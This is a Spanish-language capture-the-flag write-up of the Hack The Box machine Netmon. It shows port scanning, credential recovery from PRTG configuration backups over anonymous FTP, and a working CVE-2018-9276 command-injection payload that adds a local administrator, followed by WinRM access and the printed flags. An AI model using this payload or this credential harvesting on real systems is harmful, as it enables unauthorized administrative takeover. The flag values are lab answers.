---
category: Hack The Box
tags:
  - eJPT
  - eWPT
title: Machine Netmon
comments: "true"
image: /assets/img/machines/Netmon/Netmonbanner.jpeg
---
## Introducción
Netmon es una máquina de dificultad easy en entorno Windows, centrada en tareas de enumeración básica y explotación directa. Durante la fase inicial, se identifica un servicio FTP accesible de forma anónima, que permite la lectura de archivos de configuración del software PRTG Network Monitor. A través de estos archivos, es posible recuperar credenciales válidas del sistema. Posteriormente, se detecta que la versión de PRTG es vulnerable a Remote Code Execution (RCE), lo que facilita la obtención de una shell con privilegios, completando así la explotación de la máquina.

## Skills

- FTP Enumeration
- CVE-2018-9276

## Enumeración
Se realizó un escaneo de puertos, identificando que la máquina expone varios servicios interesantes, incluyendo FTP (21), HTTP (80), servicios RPC y SMB (135, 139, 445), así como WinRM (5985, 47001) y puertos dinámicos relacionados con RPC. 
```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.152
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Scanning 10.10.10.152 [65535 ports]
Discovered open port 21/tcp on 10.10.10.152
Discovered open port 135/tcp on 10.10.10.152
Discovered open port 80/tcp on 10.10.10.152
Discovered open port 445/tcp on 10.10.10.152
Discovered open port 139/tcp on 10.10.10.152
Discovered open port 49664/tcp on 10.10.10.152
Discovered open port 49668/tcp on 10.10.10.152
Discovered open port 5985/tcp on 10.10.10.152
Discovered open port 49665/tcp on 10.10.10.152
Discovered open port 49667/tcp on 10.10.10.152
Discovered open port 47001/tcp on 10.10.10.152
Discovered open port 49666/tcp on 10.10.10.152
Discovered open port 49669/tcp on 10.10.10.152
Completed SYN Stealth Scan at 21:10, 21.40s elapsed (65535 total ports)
Nmap scan report for 10.10.10.152
Host is up, received user-set (0.22s latency).
Not shown: 64642 closed tcp ports (reset), 880 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack ttl 127
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.60 seconds
           Raw packets sent: 104223 (4.586MB) | Rcvd: 73601 (2.944MB)
```

### Interfaz WEB
Accediendo a la interfaz web, se presenta un panel de inicio de sesión perteneciente a PRTG Network Monitor, una herramienta comúnmente utilizada para el monitoreo de redes. Esta observación confirma que el servicio web expuesto corresponde a una instancia de PRTG.
![1](/assets/img/machines/Netmon/1.jpeg)

## FTP Enumeration
Durante la enumeración del servicio FTP, se confirmó que permite autenticación anónima, lo cual facilita la exploración inicial del sistema remoto sin necesidad de credenciales. Este acceso sin restricciones podría permitir la descarga de archivos de configuración u otros elementos críticos que revelen credenciales o información sobre los servicios instalados, como en este caso, potencialmente configuraciones de PRTG Network Monitor.
```bash
❯ ftp 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:alex): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -la
229 Entering Extended Passive Mode (|||51758|)
125 Data connection already open; Transfer starting.
11-20-16  10:46PM       <DIR>          $RECYCLE.BIN
02-03-19  12:18AM                 1024 .rnd
11-20-16  09:59PM               389408 bootmgr
07-16-16  09:10AM                    1 BOOTNXT
02-03-19  08:05AM       <DIR>          Documents and Settings
02-25-19  10:15PM       <DIR>          inetpub
06-21-25  08:50PM            738197504 pagefile.sys
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
12-15-21  10:40AM       <DIR>          ProgramData
02-03-19  08:05AM       <DIR>          Recovery
02-03-19  08:04AM       <DIR>          System Volume Information
02-03-19  08:08AM       <DIR>          Users
11-10-23  10:20AM       <DIR>          Windows
226 Transfer complete.
```

En este punto, tras navegar a través del servicio FTP, se logró acceder al directorio ProgramData\Paessler\PRTG Network Monitor, donde se almacenan los archivos de configuración del sistema de monitoreo PRTG. 
```bash
ftp> cd "ProgramData"
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||51759|)
125 Data connection already open; Transfer starting.
12-15-21  10:40AM       <DIR>          Corefig
02-03-19  12:15AM       <DIR>          Licenses
11-20-16  10:36PM       <DIR>          Microsoft
02-03-19  12:18AM       <DIR>          Paessler
02-03-19  08:05AM       <DIR>          regid.1991-06.com.microsoft
07-16-16  09:18AM       <DIR>          SoftwareDistribution
02-03-19  12:15AM       <DIR>          TEMP
11-20-16  10:19PM       <DIR>          USOPrivate
11-20-16  10:19PM       <DIR>          USOShared
02-25-19  10:56PM       <DIR>          VMware
226 Transfer complete.
ftp> cd Paessler
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||51769|)
125 Data connection already open; Transfer starting.
06-21-25  10:56PM       <DIR>          PRTG Network Monitor
226 Transfer complete.
ftp> cd "PRTG Network Monitor"
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||51771|)
125 Data connection already open; Transfer starting.
06-21-25  09:32PM       <DIR>          Configuration Auto-Backups
06-21-25  08:50PM       <DIR>          Log Database
02-03-19  12:18AM       <DIR>          Logs (Debug)
02-03-19  12:18AM       <DIR>          Logs (Sensors)
02-03-19  12:18AM       <DIR>          Logs (System)
06-21-25  08:50PM       <DIR>          Logs (Web Server)
06-21-25  08:55PM       <DIR>          Monitoring Database
02-25-19  10:54PM              1189697 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
06-21-25  10:56PM              1716022 PRTG Graph Data Cache.dat
02-25-19  11:00PM       <DIR>          Report PDFs
02-03-19  12:18AM       <DIR>          System Information Database
02-03-19  12:40AM       <DIR>          Ticket Database
02-03-19  12:18AM       <DIR>          ToDo Database
226 Transfer complete.
```

En este punto, se descargo el archivo PRTG Configuration.old.bak, que posiblemente contiene credenciales en texto claro o codificadas para el sistema PRTG.
```bash
ftp> get "PRTG Configuration.old.bak"
local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
229 Entering Extended Passive Mode (|||51781|)
150 Opening ASCII mode data connection.
  3% |***                                                                                                                 | 37352       36.47 KiB/s    00:29 ETAftp: Reading from network: Llamada al sistema interrumpida
  0% |                                                                                                                    |    -1        0.00 KiB/s    --:-- ETA
550 The specified network name is no longer available. 
ftp> 
```

El análisis del archivo de configuración reveló el siguiente bloque: <!-- User: prtgadmin --> seguido de la contraseña PrTg@dmin2018, lo que permite suponer un acceso legítimo al sistema de monitoreo a través de la interfaz web.
```bash
❯ grep -A 3 "User" PRTG\ Configuration.old.bak
       <!-- User: prtgadmin -->
              PrTg@dmin2018
            </dbpassword>
            <dbtimeout>
```

las credenciales obtenidas no funcionan. Siguiendo el patrón intente usar "PrTg@dmin2019" como contraseña y ha funcionado.
![2](/assets/img/machines/Netmon/2.jpeg)

## CVE-2018-9276
Una vez identificadas las credenciales, se accedió exitosamente al panel de administración web de PRTG utilizando el usuario prtgadmin y la contraseña PrTg@dmin2019. 
![3](/assets/img/machines/Netmon/3.jpeg)

Dentro del panel, se navegó a la sección "Setup > Account Settings > Notifications", donde es posible editar acciones automáticas del sistema. Esta sección permite configurar comandos personalizados para ejecutar al momento de lanzar una notificación.
![4](/assets/img/machines/Netmon/4.jpeg)

Para aprovechar la funcionalidad de ejecución de comandos en la sección de notificaciones. Este comando crea un nuevo usuario llamado testing con la contraseña test123! y lo añade automáticamente al grupo de administradores locales, lo que permitió obtener acceso con privilegios elevados en el sistema.

```plaintext
test.txt | net user testing test123! /add ; net localgroup administrators testing /add
```

![5](/assets/img/machines/Netmon/5.jpeg)

Luego de crear la notificación, se utilizó la opción Send Test Notification para forzar la ejecución inmediata del comando configurado. Esto permitió que el usuario testing fuera creado y añadido al grupo de administradores locales sin necesidad de esperar un evento real.
![6](/assets/img/machines/Netmon/6.jpeg)

Para validar la creación del usuario con privilegios administrativos, utilicé crackmapexec con las credenciales configuradas en la notificación maliciosa. El comando confirmó que el usuario tiene acceso válido al sistema bajo el dominio netmon.
```bash
❯ crackmapexec smb 10.10.10.152 -u 'testing' -p 'test123!'
SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
SMB         10.10.10.152    445    NETMON           [+] netmon\testing:test123! (Pwn3d!)
```

Posteriormente, se verificó el acceso mediante el servicio WinRM utilizando las mismas credenciales. El resultado con crackmapexec confirmó que el usuario testing tiene acceso válido a través de WinRM, lo que permite una conexión remota y control del sistema bajo el contexto de un usuario con privilegios administrativos.
```bash
❯ crackmapexec winrm 10.10.10.152 -u 'testing' -p 'test123!'
SMB         10.10.10.152    5985   NETMON           [*] Windows 10.0 Build 14393 (name:NETMON) (domain:netmon)
HTTP        10.10.10.152    5985   NETMON           [*] http://10.10.10.152:5985/wsman
HTTP        10.10.10.152    5985   NETMON           [+] netmon\testing:test123! (Pwn3d!)
```

Con las credenciales validadas, se estableció una conexión remota mediante evil-winrm. La sesión iniciada confirmó el acceso bajo el usuario netmon\testing, permitiendo ejecutar comandos de forma remota en la máquina objetivo y continuar con la explotación.
```bash
❯ evil-winrm -i 10.10.10.152 -u 'testing' -p 'test123!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\testing\Documents> whoami
netmon\testing
```

### Captura flag usuario
Con el acceso remoto establecido como el usuario testing, se navegó hacia el directorio C:\Users\Public\Desktop donde se encontró la primera flag.
```bash
*Evil-WinRM* PS C:\Users\testing\Documents> cd C:\Users\
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/25/2019  10:44 PM                Administrator
d-r---        1/15/2024  10:03 AM                Public
d-----        6/22/2025   2:44 PM                testing


*Evil-WinRM* PS C:\Users> cd Public
*Evil-WinRM* PS C:\Users\Public> ls


    Directory: C:\Users\Public


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        1/15/2024  10:03 AM                Desktop
d-r---         2/3/2019   7:05 AM                Documents
d-r---        7/16/2016   9:18 AM                Downloads
d-r---        7/16/2016   9:18 AM                Music
d-r---        7/16/2016   9:18 AM                Pictures
d-r---        7/16/2016   9:18 AM                Videos


*Evil-WinRM* PS C:\Users\Public> cd Desktop
*Evil-WinRM* PS C:\Users\Public\Desktop> ls


    Directory: C:\Users\Public\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/2/2019  11:18 PM           1195 PRTG Enterprise Console.lnk
-a----         2/2/2019  11:18 PM           1160 PRTG Network Monitor.lnk
-ar---        6/21/2025   8:51 PM             34 user.txt


*Evil-WinRM* PS C:\Users\Public\Desktop> type user.txt
41abe42dc13858c1452b3d81844fe7ff
```

### Captura flag root
Luego se realizó la escalada de privilegios para acceder al directorio del administrador. Navegando a C:\Users\Administrator\Desktop, se encontró la flag de root.
```bash
*Evil-WinRM* PS C:\Users\Public\Desktop> cd C:\Users\Administrator
*Evil-WinRM* PS C:\Users\Administrator> ls


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         2/3/2019   7:08 AM                Contacts
d-r---         2/2/2019  11:35 PM                Desktop
d-r---         2/3/2019   7:08 AM                Documents
d-r---         2/3/2019   7:08 AM                Downloads
d-r---         2/3/2019   7:08 AM                Favorites
d-r---         2/3/2019   7:08 AM                Links
d-r---         2/3/2019   7:08 AM                Music
d-r---         2/3/2019   7:08 AM                Pictures
d-r---         2/3/2019   7:08 AM                Saved Games
d-r---         2/3/2019   7:08 AM                Searches
d-r---        2/25/2019  10:06 PM                Videos


*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/21/2025   8:51 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
f97ef91f09022ee477cd4b1d5ef6c6ab
```
